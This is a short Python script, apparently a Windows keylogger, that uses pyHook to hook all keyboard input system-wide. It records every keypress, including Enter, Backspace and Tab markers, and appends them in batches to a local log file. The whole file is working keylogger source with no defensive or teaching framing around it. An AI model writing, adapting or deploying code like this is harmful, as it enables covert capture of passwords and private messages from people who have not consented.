import pyHook, pythoncom, sys, logging

file_log='D:\\test\\log.txt'
data=''
def onKeyboardEvent(event):
    logging.basicConfig(filename=file_log,level=logging.DEBUG,format='%(message)s')
    chr(event.Ascii)
    logging.log(10,chr(event.Ascii))
    return True

''' fopen parameter mode 'a'
 ``a''   Open for writing.  The file is created if it does not exist.  The
         stream is positioned at the end of the file.  Subsequent writes
         to the file will always end up at the then current end of file,
         irrespective of any intervening fseek(3) or similar.
'''
def local():
    global data
    if len(data)>100:
        fp=open(file_log,"a")
        fp.write(data)
        fp.write('\n')
        fp.close()
        data=''
    return True

def keypressed(event):
    global data
    if event.Ascii==13:
        keys='<ENTER>'
    elif event.Ascii==8:
        keys='<BACK SPACE>'
    elif event.Ascii==9:
        keys='<TAB>'
    else:
        keys=chr(event.Ascii)
    data=data+keys 
    local()

hooks_manager=pyHook.HookManager()
#hooks_manager.KeyDown=onKeyboardEvent
hooks_manager.KeyDown=keypressed

hooks_manager.HookKeyboard()

pythoncom.PumpMessages()
